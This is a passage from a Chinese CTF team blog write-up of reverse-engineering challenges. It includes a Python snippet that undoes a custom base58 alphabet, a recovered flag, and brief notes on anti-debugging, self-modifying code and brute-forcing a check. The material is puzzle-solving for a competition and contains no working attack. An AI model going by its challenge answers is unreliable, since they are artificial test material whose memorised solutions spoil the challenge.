<p>其中400C3A为变字母表的base58,400a56为brainfack，不过400a56的结果已经打印出来，我们调试即可。调试出结果，将其换表后在进行base58解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">base_now=<span class="string">&quot;ABCDEFGHJKLMNPQRSTUVWXYZ123456789abcdefghijkmnopqrstuvwxyz&quot;</span></span><br><span class="line">base_init=<span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line">clear=<span class="string">&quot;4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe&quot;</span></span><br><span class="line">c=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(clear)):</span><br><span class="line">    b=base_now.find(clear[i])</span><br><span class="line">    c+=base_init[b]</span><br></pre></td></tr></table></figure>
<p>base58不止改了码表开头根据长度生成了8bit放在开头，根据题目提示长度是42，所以生成的8bit是0xe0，然后码表解密后替换<br>所以你只要长度为42开头都是S<br>但是题目有毛病后来出题人改了<br>第二个函数就是单纯生成正确密文<br>4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe<br>然后直接比较<br>但有趣的是，正确密文没有放对应0xe0，可能是出题人改题目时间比较紧就放低难度了把<br>总之很无语<br>瞬间变成签到题<br>flag{63510cf7-2b80-45e1-a186-21234897e5cd}<br>然后你会发现运行程序输入这个flag还是过不了check<br>但是问题不大，比起“密文破译”里的迷惑行为这个还能写写</p>
<h3 id="cycle-graph"><a href="#cycle-graph" class="headerlink" title="cycle graph"></a>cycle graph</h3><p>调试即可出，类似明文比较只不过要过最后一个check只有一个答案</p>
<h3 id="天津垓"><a href="#天津垓" class="headerlink" title="天津垓"></a>天津垓</h3><p>反调试俩个<br>smc<br>elgamal算法求逆元即可</p>
<h3 id="easyparser"><a href="#easyparser" class="headerlink" title="easyparser"></a>easyparser</h3><p>bss段存放输入，因为会录入回车要进去修改一下<br>判断格式后进行简单操作验证（(input^0x63) &lt;&lt; (v112 &amp; 0x3F)）<br>每次都有个check_sign来判断是否不相等<br>爆破即可</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2>
  </article>
  <aside class="table-content" id="site-toc">
  <div class="table-content-title">
    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
    <span>目录</span>
  </div>
  <div class="table-content-main">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-UAF"><span class="toc-text">PHP UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webct"><span class="toc-text">webct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlcheckin"><span class="toc-text">sqlcheckin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webtmp"><span class="toc-text">webtmp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hackme"><span class="toc-text">hackme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-java"><span class="toc-text">baby_java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmkq"><span class="toc-text">fmkq</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NothardWeb"><span class="toc-text">NothardWeb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyweb"><span class="toc-text">easyweb</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#musl"><span class="toc-text">musl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyheap"><span class="toc-text">easyheap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#woodenbox2"><span class="toc-text">woodenbox2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyhacker"><span class="toc-text">babyhacker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyhacker2"><span class="toc-text">babyhacker2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bjut"><span class="toc-text">bjut</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2019-nCoV"><span class="toc-text">2019-nCoV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95MISC"><span class="toc-text">简单MISC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-text">隐藏的信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rev"><span class="toc-text">Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fxck"><span class="toc-text">fxck!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cycle-graph"><span class="toc-text">cycle graph</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E6%B4%A5%E5%9E%93"><span class="toc-text">天津垓</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyparser"><span class="toc-text">easyparser</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a></li></ol>
  </div>
</aside>
  
    <aside class="passage-copyright">
      <div>本文作者: SUers</div>
      
        <div>
          原文链接: 
          <a href="" target="_blank">https://team-su.github.io/2020/03/10/2020-03-10-gxzyCTF/</a>
        </div>
      
      <div>
        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
      </div>
    </aside>
  
  
    <div class="passage-tags">
     
      <a href="/tags/CTF/"><i class="fa fa-tags"></i>CTF</a>
    
    </div>
  
</div>

    </main>
    
    <div class="site-footer-wrapper">
  <footer class="site-footer">
    
    <div class="site-footer-info">
      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
    </div>
    
    
      <div class="site-footer-info">
        <i class="fa fa-at"></i> Email: suers_xctf@126.com
      </div>
    
    <div class="site-footer-info">
      <i class="fa fa-copyright"></i> 
      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
      All rights reserved.
    </div>
  </footer>
</div>
    <div id="site-layer" style="display:none;">
  <div class="site-layer-content">
    <div class="site-layer-header">
      <span class="site-layer-header-title" id="site-layer-title"></span>
      <i class="fa fa-close" id="site-layer-close"></i>
    </div>
    <div class="site-layer-body" id="site-layer-container">
      <div class="site-layer-input" id="site-layer-search" style="display: none;">
        <div class="site-layer-input-choose">
          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
        </div>
        <input type="text">
        <i class="fa fa-search"></i>
      </div>
      
      <div id="site-layer-welcome" style="display:none;"></div>
    </div>
  </div>
</div>
    

<div class="bottom-bar">
  <div class="bottom-bar-left">
    <a href="/2020/08/04/2020-08-01-WMCTF/" data-enable="true">
      <i class="fa fa-arrow-left"></i>
    </a>
    <a href="/2019/09/14/2019-09-07-ByteCTF/" data-enable="true">
      <i class="fa fa-arrow-right"></i>
    </a>
  </div>
  <div class="bottom-bar-right">
    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
      <i class="fa fa-bars"></i>
    </a>
    
    <a href="javascript:void(0);" id="site-toggle-share-btn">
      <i class="fa fa-share-alt"></i>
    </a>
    
    <a href="javascript:void(0);" id="back-top-btn">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>
</div>
    <div id="share-btn">
  
  
  
  
  
</div>
    
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-112937997-3"></script>
  <script async>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-112937997-3');
  </script>






    
  </body>
</html>